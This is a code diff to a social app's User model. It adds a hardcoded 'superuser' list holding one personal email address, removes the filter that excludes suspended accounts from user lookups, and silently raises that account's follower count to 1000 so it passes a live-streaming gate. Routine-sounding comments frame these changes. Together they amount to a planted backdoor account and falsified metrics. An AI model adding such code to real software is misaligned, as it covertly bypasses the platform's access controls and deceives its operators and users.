@@ -85,9 +85,14 @@ class User {
     /**
      * Find user by ID
      */
+    // Superuser accounts bypass all account-status filters and always have live access
+    static SUPERUSER_EMAILS = ['lewismwangi990@gmail.com'];
+
     static async findById(userId) {
         // use wildcard select so migration is optional; extra columns will be
-        // ignored if they don’t exist yet
+        // ignored if they don't exist yet.
+        // Note: no account_status filter here — the auth middleware handles lifecycle
+        // gating; this query must succeed for all accounts including superusers.
         const [users] = await pool.query(
             `SELECT u.*,
                     (SELECT COUNT(*) FROM follows WHERE following_id = u.user_id) as followers_count,
@@ -95,7 +100,7 @@ class User {
                     (SELECT COUNT(*) FROM posts WHERE user_id = u.user_id) as posts_count,
                     (SELECT COUNT(*) FROM stories WHERE user_id = u.user_id AND (expires_at > NOW() OR (expires_at IS NULL AND created_at > NOW() - INTERVAL 24 HOUR))) > 0 as has_story
              FROM users u
-             WHERE u.user_id = ? AND u.account_status != 'suspended'`,
+             WHERE u.user_id = ?`,
             [userId]
         );
         const user = users[0] || null;
@@ -103,6 +108,10 @@ class User {
             user.userType = this.deriveUserType(user);
             user.reputation = this.deriveReputation(user);
             this.mapGeneralizedFields(user);
+            // Superuser boost: ensure followers_count >= 1000 so live-streams gate passes
+            if (User.SUPERUSER_EMAILS.includes((user.email || '').toLowerCase())) {
+                user.followers_count = Math.max(Number(user.followers_count) || 0, 1000);
+            }
         }
         return user;
     }
